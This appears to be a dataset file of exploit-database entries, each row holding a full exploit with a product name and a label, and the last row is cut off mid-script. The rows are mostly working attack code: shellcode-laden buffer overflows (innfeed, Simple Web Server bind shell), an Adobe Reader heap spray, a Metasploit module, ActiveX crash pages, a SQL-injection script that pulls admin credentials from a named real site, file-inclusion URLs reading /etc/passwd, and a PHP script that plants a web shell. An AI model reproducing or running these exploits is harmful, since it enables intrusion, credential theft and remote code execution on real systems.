""\x31\xdb\x89\xd8\xb0\x17\xcd\x80"" /*setuid(0) */              ""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c""              ""\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb""              ""\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"";  #endif  #ifdef SLACKWARE /* optimized shellcode for slackware 7.0 (non setuid(getuid()) shell) */ static char shellcode[]= ""\xeb\x15\x5b\x89\x5b\x0b\x31\xc0\x88\x43\x0a\x89\x43\x0f\xb0\x0b\x8d\x4b\x0b\x31\xd2\xcd\x80\xe8\xe6\xff\xff\xff/bin/bash1""; #endif  unsigned long get_sp(void) {   __asm__(""movl %esp, %eax""); }  void usage(char *name) {   printf(""Usage: %s <offset> <align> <buffer>\n"", name);   printf(""Defcom Labs @ Spain ...\n"");   printf(""Enrique A. Sanchez Montellano (@defcom.com)\n"");   exit(0); }  int main(int argc, char **argv) {   char *code;   int offset = OFFSET;   int align = ALIGN;   int buffer = BUFFER;   unsigned long addr;   int i;    if(argc > 1) offset = atoi(argv[1]);   if(argc > 2) align = atoi(argv[2]);   if(argc > 3) buffer = atoi(argv[3]);    code = (char *)malloc(buffer);    printf(""[ + ] innfeed buffer overflow (passed to startinnfeed) [ + ]\n"");   printf(""------------------------------------------------------------\n"");   printf(""[ + ] Found by: \n\n[ + ] Alex Hernandez (alex.hernandez@defcom.com) \n[ + ] Enrique Sanchez (@defcom.com ... Yes is just @defcom.com)\n"");   printf(""[ + ] Defcom Labs @ Spain ....\n"");   printf(""[ + ] Coded by Enrique A. Sanchez Montellano (El Nahual)\n\n"");    addr = get_sp() - offset;    printf(""[ + ] Using address 0x%x\n"", addr);    for(i = 0; i <= buffer; i += 4) {    *(long *)&code[i] = 0x90909090;   }    *(long *)&code[buffer - 4] = addr;   *(long *)&code[buffer - 8] = addr;    memcpy(code + buffer - strlen(shellcode) -8 - align, shellcode, strlen(shellcode));    printf(""[ + ] Starting exploitation ... \n\n"");    // REDHAT, MANDRAKE ... #ifdef REDHAT   execl(""/usr/bin/startinnfeed"", ""/usr/bin/startinnfeed"", ""-c"", code, NULL); #endif    // SLACKWARE #ifdef SLACKWARE   execl(""/usr/lib/news/bin/startinnfeed"", ""/usr/lib/news/bin/startinnfeed"", ""-c"", code, NULL); #endif    return 0; }",ISC InterNetNews,1
8570,"Adobe 8.1.4/9.1 - 'customDictionaryOpen()' Code Execution //############## //Exploit made by Arr1val //Proved in adobe 9.1 and adobe 8.1.4 on linux //##############  var memory; function New_Script() { 	var nop = unescape(""%u9090%u9090""); var shellcode = unescape(""%uc92b%ue983%ud9ee%ud9ee%u2474%u5bf4%u7381%uc513%u4871%u83a5%ufceb%uf4e2%uaaf4%ue61b%u1b96%ucf4a%u29a3%u44c1%uf108%ufcdb%u4e75%u2585%u088c%ufeb1%u199f%ua442%u88da%ucd2e%ucac4%uc30b%uf896%u15a9%u21a3%uf619%u904c%u680b%u2345%u8a20%u02ea%ucd20%u13ea%ucb21%u924c%uf61a%u904c%uaef8%uf108%ua548"");//443 on 10.1.31.249  	while(nop.length <= 0x10000/2) nop+=nop; 	nop=nop.substring(0,0x10000/2 - shellcode.length);  	memory=new Array(); 	for(i=0;i<0x6ff0;i++) 	{memory[i]=nop + shellcode;}  //start exploit now start();  function start() { 	this.spell.customDictionaryOpen(0,nop);//so the exploit jumps actually to 0x90909090. Place a very long 'AAAA' at the second param to go to 0x41414141 ;) }  }  //############################  # milw0rm.com [2009-04-29]",Adobe,1
16454,"ShixxNOTE 6.net - Font Field Overflow (Metasploit) ## # $Id: shixxnote_font.rb 9525 2010-06-15 07:18:08Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'ShixxNOTE 6.net Font Field Overflow', 			'Description'    => %q{ 					This module exploits a buffer overflow in ShixxNOTE 6.net. 				The vulnerability is caused due to boundary errors in the 				handling of font fields. 			}, 			'Author'         => 'MC', 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9525 $', 			'References'     => 				[ 					['CVE', '2004-1595'], 					['OSVDB', '10721'], 					['BID', '11409'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'    => 650, 					'BadChars' => ""\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win',  			'Targets'        => 				[ 					[ 'ShixxNOTE 6.net Universal', { 'Ret' => 0x10041951 } ], 				],  			'Privileged'     => false,  			'DisclosureDate' => 'Oct 4 2004',  			'DefaultTarget' => 0))  		register_options( 			[ 				Opt::RPORT(2000) 			], self.class)  	end  	def exploit 		connect  		print_status(""Trying target #{target.name}..."")  		sploit  =  rand_text_alpha_upper(8, payload_badchars) 		sploit  += ""~~"" 		sploit  += rand_text_alpha_upper(118, payload_badchars)  		seh     =  generate_seh_payload(target.ret)  		sploit[112, seh.length] = seh 		sploit  += rand_text_alpha_upper(200, payload_badchars) 		sploit  += ""~"" * 10  		sock.put(sploit)  		handler 		disconnect 	end  end",ShixxNOTE,1
28400,"Microsoft Internet Explorer 6 - 'TSUserEX.dll' ActiveX Control Memory Corruption source: https://www.securityfocus.com/bid/19570/info  Microsoft Internet Explorer is prone to a memory-corruption vulnerability. This is related to the handling of the 'tsuserex.dll' COM object ActiveX control.  Attackers may exploit this issue via a malicious web page to execute arbitrary code in the context of the currently logged-in user. Exploitation attempts may lead to a denial-of-service condition as well. Attackers may also employ HTML email to carry out an attack.   =============== tsuserex.dll.htm start ================  <!-- // Microsoft Windows 2003 (tsuserex.dll) COM Object Instantiation Vulnerability // tested on Windows 2003 EE SP1 CN  // http://www.xsec.org // nop (nop#xsec.org)  // CLSID: {E2E9CAE6-1E7B-4B8E-BABD-E9BF6292AC29} // Info: ADsTSUserEx Class // ProgID: tsuserex.ADsTSUserEx.1 // InprocServer32: C:\WINDOWS\system32\tsuserex.dll  --!>  <html><body> <object classid=""CLSID:{E2E9CAE6-1E7B-4B8E-BABD-E9BF6292AC29}""> </object> </body> </html>  =============== tsuserex.dll.htm end ==================",Microsoft Internet Explorer,1
23567,"Sony PC Companion 2.1 - 'Load()' Unicode Stack Buffer Overflow Sony PC Companion 2.1 (Load()) Stack-based Unicode Buffer Overload SEH   Vendor: Sony Mobile Communications AB Product web page: http://www.sonymobile.com Affected version: 2.10.115 (Production 27.1, Build 830)                   2.10.108 (Production 26.1, Build 818)  Summary: PC Companion is a computer application that acts as a portal to Sony Xperia and operator features and applications, such as phone software updates, management of contacts and calendar, media management with Media Go, and a backup and restore feature for your phone content.  Desc: The vulnerability is caused due to a boundary error in PimData.dll when handling the value assigned to the 'File' item in the Load function and can be exploited to cause a stack-based buffer overflow via an overly long string which may lead to execution of arbitrary code on the affected machine.   ------------------------------------------------------------------------------  STATUS_STACK_BUFFER_OVERRUN encountered (59c.162c): Break instruction exception - code 80000003 (first chance) eax=00000000 ebx=5f392b80 ecx=75b1de28 edx=0019dd59 esi=00000000 edi=002891c4 eip=75b1dca5 esp=0019dfa0 ebp=0019e01c iopl=0         nv up ei pl zr na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 KERNEL32!FormatMessageA+0x13c85: 75b1dca5 cc              int     3 0:000> !exchain 0019e00c: KERNEL32!RegSaveKeyExA+3e9 (75b49b72) Invalid exception stack at 00420042 0:000> d edi 002891c4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 002891d4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 002891e4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 002891f4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 00289204  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 00289214  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 00289224  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 00289234  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. 0:000>  ------------------------------------------------------------------------------   Tested on: Microsoft Windows 7 Ultimate SP1 (EN) 32bit   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2012-5118 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5118.php  http://cwe.mitre.org/data/definitions/121.html   09.11.2012  ---   <html> <body> <object classid='clsid:EEA36793-F574-4CC1-8690-60E3511CFEAA' id='overrun' /> <script language='vbscript'> targetFile = ""C:\Program Files\Sony\Sony PC Companion\PimData.dll"" prototype  = ""Sub Load ( ByVal File As String )"" memberName = ""Load"" progid     = ""PimDataLib.DataItemCollection"" argCount   = 1  File=String(262, ""A"") + ""BB"" + String(1000, ""C"")  '             ^          ^              ^ '             |          |              | '----------- junk ----- nseh -------- junk ------  overrun.Load File  </script> </body> </html>",Sony PC Companion,1
5783,"Yuhhu 2008 SuperStar - 'board' SQL Injection <?php /* Coded By RMx Yuhhu 2008 SuperStar Sql injection exploit... BiyoSecurity.Com & Coderx.org Thanx : Liz0zim & Cr@zy_King */ set_time_limit(0); error_reporting(E_ALL); function yolla($site,$liz0zim){ global $veri;$exploit = fsockopen(gethostbyname($site),""80""); if(!$exploit){die(""BaÄŸlantÄ± saÄŸlanamadÄ±...""); }else{fputs($exploit,$liz0zim);} while(!feof($exploit)) { $veri .=fgets($exploit);} fclose($exploit); return $veri;} $site = ""elmayra.com""; $path = ""/forums/""; $rmx =  ""GET "".$path.""view.topics.php?board='+union+select+0,concat(0x6B,0x75,0x6C,0x6C,0x61,0x6E,0x69,0x63,0x69,0x3A,0x20,admin_username,0x3a,0x73,0x69,0x66,0x72,0x65,0x3A,0x20,admin_password,0x20,0x61,0x64,0x6D,0x69,0x6E,0x20,0x74,0x69,0x70,0x69,0x3A,0x20,admin_type,0x61,0x64,0x6D,0x69,0x6E,0x20,0x69,0x64,0x3A,admin_id),1,2%20from%20joovili_admins/* HTTP/1.1\r\n""; $rmx .= ""Host: $site\r\n""; //$rmx .= ""Content-Type: application/x-www-form-urlencoded\r\n""; $rmx .= ""Content-Type: text/plain\r\n""; $rmx .= ""Connection: Close\r\n\r\n""; $tuttum=yolla(""$site"",""$rmx""); $ara=""#class=\""linkbeyaz\"">(.*)</a></td>#""; $bul=preg_match($ara,$tuttum,$rmx); $huseyin=str_replace(""class=\""linkbeyaz\"">"","""",$rmx); echo $site.""<br>""; echo $huseyin[0]; ?>  author : Dj Remix   # milw0rm.com [2008-06-10]",SuperStar,1
2451,"phpMyWebmin 1.0 - 'window.php' Remote File Inclusion ####################################### +PHP MyWebMin 1.0 Remote File Include +Advisory #5 +Product :PHP MyWebMin +Develop: +www.josh.ch/joshch/php-tools/phpmywebmin,download.html +Vulnerable: Remote File Includes +Risk:High +Class:Remote +Discovered:by Kernel-32 +Contact: kernel-32@linuxmail.org +Homepage: http://kernel-32.blogspot.com +Greetz: BeLa ;) ########################################  Vulnerable File:window.php $ordner = opendir(""$target""); ?>  and  include(""$target/preferences.php"");  if($action != """") { include(""$action.php""); ?>  Examples: http://site/path/window.php?target=/etc http://site/path/home.php?target=/home http://site/path/window.php?action=Shell.php  # milw0rm.com [2006-09-28]",phpMyWebmin,1
16154,"Horde - Horde_Image::factory driver Argument Local File Inclusion # Exploit Title: Horde Horde_Image::factory driver Argument Local File Inclusion # Google Dork: intitle:horde # Date: 10-02-2011 # Author: skysbsb # Software Link: http://www.horde.org/download/ # Version: Horde 3.3.2 # Tested on: linux # CVE : CVE-2009-0932  The original disclosure was done by Gunnar Wrobel from Horde team.. it was found in a code audit (january 2009). It's an old vuln(2009) but still unpublished in exploit-db. There is a lot of vulnerables sites out there. Just try google =)   Vuln description: The version of Horde, Horde Groupware, or Horde Groupware Webmail Edition installed on the remote host fails to filter input to the 'driver' argument of the  'Horde_Image::factory' method before using it to include PHP code in 'lib/Horde/Image.php'.  Regardless of PHP's 'register_globals' and 'magic_quotes_gpc' settings, an unauthenticated attacker can exploit this issue to view arbitrary files or possibly to execute arbitrary PHP code on the remote host, subject to the privileges of the web server user id.   Fix: If using Horde, upgrade to version 3.3.3 / 3.2.4 or later. If using Horde Groupware, upgrade to version 1.2.2 / 1.1.5 or later. If using Horde Groupware Webmail Edition, upgrade to version 1.2.2/1.1.5 or later.   PoC: http://www.vulnsite.com/horde/util/barcode.php ?type=../../../../../../../../../../../etc/./passwd%00    # skysbsb [*at*] gmail.com",Horde - Horde_Image::factory,1
8786,"Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure Severe vulnerability due to a bug in FreeBSD, OS X and Solaris (<10) filesystems affecting Lighttpd (<1.4.23)  A bug was discovered in the way FreeBSD, OS X and Solaris (prior version 10) handle symlinks appended with a slash (/). Accessing a regular file through a symbolic link with appended slash succeeds because the slash apperently gets silently dropped. On systems that do not expose this behaviour, a call to stat(""symlink.php/"") or open(""symlink.php/"") to a symlink pointing to example.php, will not succeed and set errno to ENOTDIR. This is not the case on the systems mentioned.  The vulnerability arises when an application filters access to or decides how to handle a file based on a suffix match. An attacker could circumvent normal behaviour by appended a slash to the filename, resulting in said access rules not applying.   Lighttpd in versions prior to 1.4.23 was not aware of this bug and therefor can be tricked by an attacker. It decides how to process a request based on suffix rules provided in its config, usually matching ""^.*\.php$"". The attacker can bypass this rule and gain access to the sourcecode of the .php file possibly revealing sensitive information like passwords.  Other applications, not only webservers, are probably vulnerable due to this flaw as well.  The bug has been known since at least the year 2000 but has remained unfixed to this day: http://www.freebsd.org/cgi/query-pr.cgi?pr=kern/21768  Lighttpd 1.4.23 will include a workaround for said problem to prevent attacks. Bug report: http://redmine.lighttpd.net/issues/1989  Description  If you put a trailing slash / after the .php and that file is a link, it will just display the content of the file.  2009-05-22 13:40:37: (response.c.221) -- splitting Request-URI 2009-05-22 13:40:37: (response.c.222) Request-URI : /index.php/ 2009-05-22 13:40:37: (response.c.223) URI-scheme : http 2009-05-22 13:40:37: (response.c.224) URI-authority: localhost 2009-05-22 13:40:37: (response.c.225) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.226) URI-query : 2009-05-22 13:40:37: (response.c.254) -- sanatising URI 2009-05-22 13:40:37: (response.c.255) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.221) -- splitting Request-URI 2009-05-22 13:40:37: (response.c.222) Request-URI : /index.php/ 2009-05-22 13:40:37: (response.c.223) URI-scheme : http 2009-05-22 13:40:37: (response.c.224) URI-authority: localhost 2009-05-22 13:40:37: (response.c.225) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.226) URI-query : 2009-05-22 13:40:37: (response.c.254) -- sanatising URI 2009-05-22 13:40:37: (response.c.255) URI-path : /index.php/ 2009-05-22 13:40:37: (mod_access.c.135) -- mod_access_uri_handler called 2009-05-22 13:40:37: (response.c.391) -- before doc_root 2009-05-22 13:40:37: (response.c.392) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.393) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.394) Path : 2009-05-22 13:40:37: (response.c.442) -- after doc_root 2009-05-22 13:40:37: (response.c.443) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.444) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.445) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.462) -- logical -> physical 2009-05-22 13:40:37: (response.c.463) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.464) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.465) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.482) -- handling physical path 2009-05-22 13:40:37: (response.c.483) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.490) -- file found 2009-05-22 13:40:37: (response.c.491) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.640) -- handling subrequest 2009-05-22 13:40:37: (response.c.641) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (mod_indexfile.c.151) -- handling the request as Indexfile 2009-05-22 13:40:37: (mod_indexfile.c.152) URI : /index.php/ 2009-05-22 13:40:37: (mod_access.c.135) -- mod_access_uri_handler called 2009-05-22 13:40:37: (mod_staticfile.c.394) -- handling file as static file 2009-05-22 13:40:37: (response.c.652) -- subrequest finished 2009-05-22 13:40:37: (response.c.121) Response-Header:  # milw0rm.com [2009-05-26]",Lighttpd,1
2415,"exV2 < 2.0.4.3 - 'extract()' Remote Command Execution #!/usr/bin/php -q -d short_open_tag=on <? print_r(' ------------------------------------------------------------------------------- exV2 <= 2.0.4.3 extract() remote commands execution exploit mail: retrog@alice.it site: http://retrogod.altervista.org dork: ""Powered by eXV2 Vers"" ------------------------------------------------------------------------------- '); /* this works regardless of php.ini settings two different exploit methods for register_globals=on or off */ if ($argc<4) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path cmd OPTIONS host:      target server (ip/hostname) path:      path to exv2 cmd:       a shell command Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /exv2/ ls -la -P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 / ls -la -p81 ----------------------------------------------------------------------------- '); die; }  /*   software site: http://www.exv2.de/modules/welcome/    i) vulnerable code in include/common.php :  ... // ################# :: Register Globals Compatibility :: ################# 	$globals_test = @ini_get('register_globals'); 	if ( isset($globals_test) && empty($globals_test) ) {echo ""merdaaaaaaaaaaaaaaaaaaaa\n""; 	// These still need some work :: Cookie|Server|Env are ok now. 		if ( !empty($_GET) )  { extract($_GET, EXTR_SKIP);  } 		if ( !empty($_POST) ) { extract($_POST, EXTR_OVERWRITE); } 		define('_GLOBALS', FALSE); 	} else { 		define('_GLOBALS', TRUE); 	} ...  if register_globals = off you can overwrite every var on target server found this exploitation method:  some lines after this code we have:  ... // ################ Include page-specific lang file ################ // von Zeile 135 herunter gesetzt, da Userinfo usw. nicht in die language übernommen wurde 	if ( isset($xoopsOption['pagetype']) ) { 		if ( @file_exists(XOOPS_ROOT_PATH.'/language/'.$xoopsConfig['language'].'/'.$xoopsOption['pagetype'].'.php') ) { 			include_once(XOOPS_ROOT_PATH.'/language/'.$xoopsConfig['language'].'/'.$xoopsOption['pagetype'].'.php'); 		} else { 			include_once(XOOPS_ROOT_PATH.'/language/english/'.$xoopsOption['pagetype'].'.php'); 		} 	} ...  so we modify the $xoopsOption['pagetype'] var to reach the mail_template.php script in /include folder where we have:  ... 	$code=stripslashes(isset($code) ? $code : """"); 	if(isset($op_action) && $op_action == ""save"" && $lang != """" && $script != """"){ 		$code=str_replace(""&lt;"",""<"",$code); 		$fp=fopen($mod_path.""/language/"".$lang.""/mail_template/"".$script, ""w""); 		fputs ($fp,$code); 		fclose($fp); 		header(""Location:index.php?"".$temp_op.""=mail_template&script="".$script.""&lang="".$lang."""");         exit(); 	} ...  now we can save our shell code in a php file...  also, if register_globals = On you can call directly the mail_template.php script to do the same stuff  through the extract() bug is also possibile to delete recursively all sites content including the /modules/system/admin/design/include/conf_theme.php script and to upload images without authorization in /images/library folder including the image manager script and setting some vars  ii) an sql injection issue, poc: http://retrogod.altervista.org/exv2_2043_sql.html  iii) registered user can delete an arbitrary file on target server through avatar upload features, because of a directory traversal in old_avatar argument, passed to an unlink()  this is the poc for i) */ error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; }  $host=$argv[1]; $path=$argv[2]; $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  //register_globals=off, extract() tricks... $data='-----------------------------7d626f251b00fa Content-Disposition: form-data; name=""xoopsOption[pagetype]""  ../../include/mail_template -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""op_action""  save -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""mod_path""  . -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""lang""  english -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""script""  ../../../images/library/placeholder.php -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""code""  <?php set_time_limit(0); error_reporting(0); echo ""my_delim""; passthru($_SERVER[HTTP_SUNTZU]);?> -----------------------------7d626f251b00fa-- '; $packet =""POST "".$p."" HTTP/1.0\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d626f251b00fa\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Cookie: "".$cookie.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(2);  //register_globals=on $data='-----------------------------7d626f251b00fa Content-Disposition: form-data; name=""op_action""  save -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""mod_path""  . -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""lang""  english -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""script""  ../images/library/placeholder.php -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""code""  <?php set_time_limit(0); error_reporting(0); echo ""my_delim""; passthru($_SERVER[HTTP_SUNTZU]);?> -----------------------------7d626f251b00fa-- '; $packet =""POST "".$p.""include/mail_template.php HTTP/1.0\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d626f251b00fa\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Cookie: "".$cookie.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(2);  $packet =""GET "".$p.""images/library/placeholder.php HTTP/1.0\r\n""; $packet.=""SUNTZU: $cmd\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); if (strstr($html,""my_delim"")) {  $temp=explode(""my_delim"",$html);  die($temp[1]); } echo ""exploit failed...""; ?>  # milw0rm.com [2006-09-22]",exV2,1
19937,"Simple Web Server 2.2 rc2 - Remote Buffer Overflow use IO::Socket;  ############################################################################## # Exploit Title: SimpleWebServer 2.2-rc2 - Remote Buffer Overflow Exploit # Date: 19/07/2012 # Author: mr.pr0n (@_pr0n_) # Homepage: http://ghostinthelab.wordpress.com/ # Software Link: http://www.pmx.it/download/sws-2.2-rc2-i686.exe # Version: 2.2 rc2 # Tested on: Windows XP SP3 ############################################################################## # root@bt:~/Desktop# perl sws2_2-rc2_poc.pl 192.168.178.43 80 # +---------------------------------------------------------------+  # |   Simple Web Server 2.2 rc2 - Remote Buffer Overflow Exploit  |  # |                 mr.pr0n - http://ghostinthelab.wordpress.com  |  # +---------------------------------------------------------------+  #  # [+] Sending buffer (2104 bytes) to: 192.168.178.43:80  # [+] Exploitation Done! # [+] Please, wait couple of sec ... # [+] Got shell? #  # Microsoft Windows XP [Version 5.1.2600] # (C) Copyright 1985-2001 Microsoft Corp. #  # C:\Program Files\PMSoftware\sws> ############################################################################## print ""+---------------------------------------------------------------+ \n""; print ""|   Simple Web Server 2.2 rc2 - Remote Buffer Overflow Exploit  | \n""; print ""|                 mr.pr0n - http://ghostinthelab.wordpress.com  | \n""; print ""+---------------------------------------------------------------+ \n""; if (@ARGV != 2) {    print ""\n[-] Usage: $0 <target ip> <port> \n\n"";    exit(); }  $target = $ARGV[0]; # Target IP $port 	= $ARGV[1]; # Target port  # The egghunter. $egghunter  = ""\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"". ""\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"". ""w00t"". # The 4 byte tag! ""\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"";   # MSF windows/shell_bind_tcp LPORT=4444 $shellcode = ""\xda\xc5\xd9\x74\x24\xf4\x2b\xc9\xba\x3a\x04\xcc\xb6\x5e"". ""\xb1\x56\x31\x56\x19\x83\xee\xfc\x03\x56\x15\xd8\xf1\x30"". ""\x5e\x95\xfa\xc8\x9f\xc5\x73\x2d\xae\xd7\xe0\x25\x83\xe7"". ""\x63\x6b\x28\x8c\x26\x98\xbb\xe0\xee\xaf\x0c\x4e\xc9\x9e"". ""\x8d\x7f\xd5\x4d\x4d\x1e\xa9\x8f\x82\xc0\x90\x5f\xd7\x01"". ""\xd4\x82\x18\x53\x8d\xc9\x8b\x43\xba\x8c\x17\x62\x6c\x9b"". ""\x28\x1c\x09\x5c\xdc\x96\x10\x8d\x4d\xad\x5b\x35\xe5\xe9"". ""\x7b\x44\x2a\xea\x40\x0f\x47\xd8\x33\x8e\x81\x11\xbb\xa0"". ""\xed\xfd\x82\x0c\xe0\xfc\xc3\xab\x1b\x8b\x3f\xc8\xa6\x8b"". ""\xfb\xb2\x7c\x1e\x1e\x14\xf6\xb8\xfa\xa4\xdb\x5e\x88\xab"". ""\x90\x15\xd6\xaf\x27\xfa\x6c\xcb\xac\xfd\xa2\x5d\xf6\xd9"". ""\x66\x05\xac\x40\x3e\xe3\x03\x7d\x20\x4b\xfb\xdb\x2a\x7e"". ""\xe8\x5d\x71\x17\xdd\x53\x8a\xe7\x49\xe4\xf9\xd5\xd6\x5e"". ""\x96\x55\x9e\x78\x61\x99\xb5\x3c\xfd\x64\x36\x3c\xd7\xa2"". ""\x62\x6c\x4f\x02\x0b\xe7\x8f\xab\xde\xa7\xdf\x03\xb1\x07"". ""\xb0\xe3\x61\xef\xda\xeb\x5e\x0f\xe5\x21\xe9\x08\x2b\x11"". ""\xb9\xfe\x4e\xa5\x2f\xa2\xc7\x43\x25\x4a\x8e\xdc\xd2\xa8"". ""\xf5\xd4\x45\xd3\xdf\x48\xdd\x43\x57\x87\xd9\x6c\x68\x8d"". ""\x49\xc1\xc0\x46\x1a\x09\xd5\x77\x1d\x04\x7d\xf1\x25\xce"". ""\xf7\x6f\xe7\x6f\x07\xba\x9f\x0c\x9a\x21\x60\x5b\x87\xfd"". ""\x37\x0c\x79\xf4\xd2\xa0\x20\xae\xc0\x39\xb4\x89\x41\xe5"". ""\x05\x17\x4b\x68\x31\x33\x5b\xb4\xba\x7f\x0f\x68\xed\x29"". ""\xf9\xce\x47\x98\x53\x98\x34\x72\x34\x5d\x77\x45\x42\x62"". ""\x52\x33\xaa\xd2\x0b\x02\xd4\xda\xdb\x82\xad\x07\x7c\x6c"". ""\x64\x8c\x8c\x27\x25\xa4\x04\xee\xbf\xf5\x48\x11\x6a\x39"". ""\x75\x92\x9f\xc1\x82\x8a\xd5\xc4\xcf\x0c\x05\xb4\x40\xf9"". ""\x29\x6b\x60\x28\x23"";  $junk 		= ""\x41"" x (2048 - length(""w00tw00t"") - length($shellcode)); $ret		= 